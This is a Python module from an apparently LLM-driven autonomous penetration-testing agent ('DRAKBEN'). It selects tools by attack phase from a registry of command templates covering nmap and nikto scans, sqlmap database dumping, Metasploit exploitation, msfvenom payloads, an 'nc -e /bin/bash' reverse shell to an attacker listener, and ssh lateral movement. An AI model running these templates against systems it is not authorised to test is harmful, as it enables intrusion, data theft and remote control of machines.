# core/tool_selector.py
# DRAKBEN Tool Selector - DETERMİNİSTİK TOOL SEÇİMİ
# ZORUNLU: LLM tool seçimi state.remaining_attack_surface ile sınırlı

from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
from .state import AgentState, AttackPhase


class ToolCategory(Enum):
    """Tool kategorileri"""
    RECON = "recon"
    VULN_SCAN = "vulnerability_scan"
    EXPLOIT = "exploit"
    PAYLOAD = "payload"
    POST_EXPLOIT = "post_exploit"


@dataclass
class ToolSpec:
    """Tool specification"""
    name: str
    category: ToolCategory
    command_template: str
    phase_allowed: List[AttackPhase]
    requires_foothold: bool = False
    risk_level: str = "low"
    max_failures: int = 2


class ToolSelector:
    """
    Deterministik tool seçim mekanizması
    
    KURALLAR:
    1. LLM SADECE state.remaining_attack_surface içinden seçebilir
    2. Aynı tool 2 kez fail -> kalıcı blok
    3. Fallback ÖNCEDEN TANIMLI TABLO ile belirlenir
    4. Tool bypass = KRİTİK TASARIM HATASI
    """
    
    def __init__(self):
        # Tool registry - ÖNCEDEN TANIMLI
        self.tools: Dict[str, ToolSpec] = {
            # RECON tools
            "nmap_port_scan": ToolSpec(
                name="nmap_port_scan",
                category=ToolCategory.RECON,
                command_template="nmap -p- -T4 {target}",
                phase_allowed=[AttackPhase.INIT, AttackPhase.RECON],
                risk_level="low"
            ),
            "nmap_service_scan": ToolSpec(
                name="nmap_service_scan",
                category=ToolCategory.RECON,
                command_template="nmap -sV -p{ports} {target}",
                phase_allowed=[AttackPhase.RECON],
                risk_level="low"
            ),
            
            # VULN SCAN tools
            "nmap_vuln_scan": ToolSpec(
                name="nmap_vuln_scan",
                category=ToolCategory.VULN_SCAN,
                command_template="nmap --script vuln -p{port} {target}",
                phase_allowed=[AttackPhase.VULN_SCAN],
                risk_level="medium"
            ),
            "nikto_web_scan": ToolSpec(
                name="nikto_web_scan",
                category=ToolCategory.VULN_SCAN,
                command_template="nikto -h {target} -p {port}",
                phase_allowed=[AttackPhase.VULN_SCAN],
                risk_level="medium"
            ),
            "sqlmap_scan": ToolSpec(
                name="sqlmap_scan",
                category=ToolCategory.VULN_SCAN,
                command_template="sqlmap -u {target} --batch --level=1",
                phase_allowed=[AttackPhase.VULN_SCAN],
                risk_level="medium"
            ),
            
            # EXPLOIT tools
            "sqlmap_exploit": ToolSpec(
                name="sqlmap_exploit",
                category=ToolCategory.EXPLOIT,
                command_template="sqlmap -u {target} --batch --dump",
                phase_allowed=[AttackPhase.EXPLOIT],
                risk_level="high"
            ),
            "metasploit_exploit": ToolSpec(
                name="metasploit_exploit",
                category=ToolCategory.EXPLOIT,
                command_template="msfconsole -q -x 'use {exploit}; set RHOSTS {target}; exploit'",
                phase_allowed=[AttackPhase.EXPLOIT],
                risk_level="high"
            ),
            
            # PAYLOAD tools
            "msfvenom_payload": ToolSpec(
                name="msfvenom_payload",
                category=ToolCategory.PAYLOAD,
                command_template="msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format}",
                phase_allowed=[AttackPhase.EXPLOIT, AttackPhase.FOOTHOLD],
                requires_foothold=False,
                risk_level="high"
            ),
            "reverse_shell": ToolSpec(
                name="reverse_shell",
                category=ToolCategory.PAYLOAD,
                command_template="nc -e /bin/bash {lhost} {lport}",
                phase_allowed=[AttackPhase.EXPLOIT, AttackPhase.FOOTHOLD],
                requires_foothold=False,
                risk_level="critical"
            ),
            
            # POST-EXPLOIT tools
            "privilege_escalation": ToolSpec(
                name="privilege_escalation",
                category=ToolCategory.POST_EXPLOIT,
                command_template="sudo -l",
                phase_allowed=[AttackPhase.POST_EXPLOIT],
                requires_foothold=True,
                risk_level="high"
            ),
            "lateral_movement": ToolSpec(
                name="lateral_movement",
                category=ToolCategory.POST_EXPLOIT,
                command_template="ssh {target}",
                phase_allowed=[AttackPhase.POST_EXPLOIT],
                requires_foothold=True,
                risk_level="high"
            )
        }
        
        # Fallback mapping - ÖNCEDEN TANIMLI
        # "başarısız_tool" -> ["alternatif1", "alternatif2"]
        self.fallback_map: Dict[str, List[str]] = {
            "nmap_port_scan": [],
            "nmap_service_scan": [],
            "nikto_web_scan": [],
            "sqlmap_scan": [],
            "metasploit_exploit": [],
        }

        # Tool failure tracking (tool selector internal state)
        self.failed_tools: Dict[str, int] = {}
    
    def get_allowed_tools(self, state: AgentState) -> List[str]:
        """
        State'e göre izin verilen tool'ları döndür
        
        KURALLAR:
        - Phase'e uygun olmalı
        - Foothold gerektiriyorsa, foothold olmalı
        - Bloke edilmemiş olmalı
        """
        allowed = []
        
        for tool_name, spec in self.tools.items():
            # Phase check
            if state.phase not in spec.phase_allowed:
                continue
            
            # Foothold check
            if spec.requires_foothold and not state.has_foothold:
                continue
            
            # Blocked check
            if self.is_tool_blocked(tool_name, spec.max_failures):
                continue
            
            allowed.append(tool_name)
        
        return allowed
    
    def select_tool_for_surface(
        self, 
        state: AgentState, 
        surface: str
    ) -> Optional[Tuple[str, Dict]]:
        """
        Belirli bir attack surface için uygun tool seç
        
        Args:
            state: Current agent state
            surface: Attack surface string (e.g., "80:http")
            
        Returns:
            (tool_name, args) tuple or None
        """
        # Parse surface
        try:
            port_str, service = surface.split(":")
            port = int(port_str)
        except (ValueError, IndexError):
            return None
        
        # Get allowed tools
        allowed_tools = self.get_allowed_tools(state)
        
        # Select based on phase and service
        if state.phase == AttackPhase.RECON:
            # Service version detection
            if "nmap_service_scan" in allowed_tools:
                return ("nmap_service_scan", {"target": state.target, "ports": port})
        
        elif state.phase == AttackPhase.VULN_SCAN:
            # Web service - use web scanner
            if service in ["http", "https"] and "nikto_web_scan" in allowed_tools:
                return ("nikto_web_scan", {"target": state.target, "port": port})
            
            # Generic vuln scan
            if "nmap_vuln_scan" in allowed_tools:
                return ("nmap_vuln_scan", {"target": state.target, "port": port})
        
        elif state.phase == AttackPhase.EXPLOIT:
            # SQL injection possible
            if service in ["http", "https", "mysql", "postgres"] and "sqlmap_scan" in allowed_tools:
                return ("sqlmap_scan", {"target": f"http://{state.target}:{port}"})
        
        return None
    
    def get_fallback_tool(self, failed_tool: str, state: AgentState) -> Optional[str]:
        """
        Başarısız tool için fallback al - DETERMİNİSTİK
        
        Args:
            failed_tool: Tool that failed
            state: Current state
            
        Returns:
            Fallback tool name or None
        """
        if failed_tool not in self.fallback_map:
            return None
        
        fallbacks = self.fallback_map[failed_tool]
        allowed = self.get_allowed_tools(state)
        
        # Return first available fallback
        for fb in fallbacks:
            if fb in allowed:
                return fb
        
        return None
    
    def validate_tool_selection(
        self, 
        tool_name: str, 
        state: AgentState
    ) -> Tuple[bool, str]:
        """
        Tool seçiminin geçerli olup olmadığını kontrol et
        
        Returns:
            (valid, reason) tuple
        """
        # Tool exists?
        if tool_name not in self.tools:
            return False, f"Unknown tool: {tool_name}"
        
        spec = self.tools[tool_name]
        
        # Phase check
        if state.phase not in spec.phase_allowed:
            return False, f"Tool {tool_name} not allowed in phase {state.phase.value}"
        
        # Foothold check
        if spec.requires_foothold and not state.has_foothold:
            return False, f"Tool {tool_name} requires foothold"
        
        # Blocked check
        if self.is_tool_blocked(tool_name, spec.max_failures):
            return False, f"Tool {tool_name} is blocked due to repeated failures"
        
        return True, "Valid"

    def record_tool_failure(self, tool_name: str):
        """Tool failure kaydet (selector-local)"""
        self.failed_tools[tool_name] = self.failed_tools.get(tool_name, 0) + 1

    def is_tool_blocked(self, tool_name: str, max_failures: int = 2) -> bool:
        """Tool bloke edilmiş mi? (2 kez fail -> blok)"""
        return self.failed_tools.get(tool_name, 0) >= max_failures
    
    def get_next_phase_tools(self, state: AgentState) -> List[str]:
        """
        Bir sonraki phase için gerekli tool'ları öneri
        
        Phase progression:
        INIT -> RECON -> VULN_SCAN -> EXPLOIT -> FOOTHOLD -> POST_EXPLOIT
        """
        phase_tools = {
            AttackPhase.INIT: ["nmap_port_scan"],
            AttackPhase.RECON: ["nmap_service_scan"],
            AttackPhase.VULN_SCAN: ["nmap_vuln_scan", "nikto_web_scan", "sqlmap_scan"],
            AttackPhase.EXPLOIT: ["sqlmap_exploit", "metasploit_exploit"],
            AttackPhase.FOOTHOLD: ["msfvenom_payload", "reverse_shell"],
            AttackPhase.POST_EXPLOIT: ["privilege_escalation", "lateral_movement"]
        }
        
        return phase_tools.get(state.phase, [])
    
    def recommend_next_action(self, state: AgentState) -> Optional[Tuple[str, str, Dict]]:
        """
        State'e göre bir sonraki aksiyonu öner - DETERMİNİSTİK
        
        Returns:
            (action_type, tool_name, args) or None
        """
        # Check if we have remaining attack surface
        remaining = state.get_available_attack_surface()
        
        if remaining and state.phase in [AttackPhase.RECON, AttackPhase.VULN_SCAN]:
            # Test next surface
            surface = remaining[0]
            tool_result = self.select_tool_for_surface(state, surface)
            if tool_result:
                tool_name, args = tool_result
                return ("scan_surface", tool_name, args)
        
        # Check if we should move to next phase
        if not remaining:
            # No more surfaces to test in current phase
            if state.phase == AttackPhase.RECON and state.open_services:
                # Move to vuln scan
                return ("phase_transition", "vuln_scan", {"next_phase": AttackPhase.VULN_SCAN})
            
            elif state.phase == AttackPhase.VULN_SCAN and state.vulnerabilities:
                # Move to exploit
                return ("phase_transition", "exploit", {"next_phase": AttackPhase.EXPLOIT})
        
        # Check if we have exploitable vulns
        if state.phase == AttackPhase.EXPLOIT:
            for vuln in state.vulnerabilities:
                if vuln.exploitable and not vuln.exploit_attempted:
                    # Try to exploit
                    tool_name = self._get_exploit_tool_for_vuln(vuln)
                    if tool_name:
                        return ("exploit_vuln", tool_name, {"vuln_id": vuln.vuln_id})
        
        return None
    
    def _get_exploit_tool_for_vuln(self, vuln) -> Optional[str]:
        """Zafiyet için uygun exploit tool seç"""
        if "sql" in vuln.vuln_id.lower():
            return "sqlmap_exploit"
        # Add more mappings as needed
        return "metasploit_exploit"
